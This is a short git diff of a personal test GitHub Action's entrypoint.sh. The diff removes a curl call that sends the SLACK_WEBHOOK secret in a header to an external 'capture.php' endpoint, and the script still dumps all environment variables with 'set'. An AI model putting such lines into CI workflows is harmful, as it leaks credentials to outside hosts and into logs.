a35472cce9cd286608a36e6742bd8e6a479cf083
Cal Evans <cal@calevans.com>
2020-02-25 14:13:57 -0500

    Stuff

--- entrypoint.sh
+++ entrypoint.sh
@@ -4,16 +4,13 @@ cp /action/problem-matcher.json /github/workflow/problem-matcher.json
 
 echo "::add-matcher::${RUNNER_TEMP}/_github_workflow/problem-matcher.json"
 
-time=$(date)
-echo ::set-output name=time::$time
-
 echo "Cal's test action:"
 
 set
 
-curl -iv https://dive.calevans.com/work/capture.php -o delete.me -H "X-TEST: $SLACK_WEBHOOK"
+df -h
 
-status=$?
+ls -lh
 
 echo "::remove-matcher owner=phpcs::"
 
